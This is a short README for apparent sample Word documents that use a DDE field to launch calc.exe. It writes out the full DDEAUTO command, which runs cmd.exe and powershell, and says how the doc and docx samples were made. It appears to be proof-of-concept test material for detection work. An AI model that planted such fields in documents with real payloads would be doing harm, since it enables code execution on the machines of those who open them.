# DDE_Samples
Samples of Word documents using Dynamic Data Exchange (DDE) to launch calc.exe using the following DDE command. 

```
ddeauto "c:\\\\microsoft\\\\office\\\\word\\\\document\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe" "/c powershell.exe start-process 'calc.exe'"  \* mergeformat 
```

The samples were created with Word in Office 2016. Two of the samples were saved as doc and two were saved as docx. Two were created by pasting the command into the formula textbox, and two were created by toggling the 'field' and inserting the command. 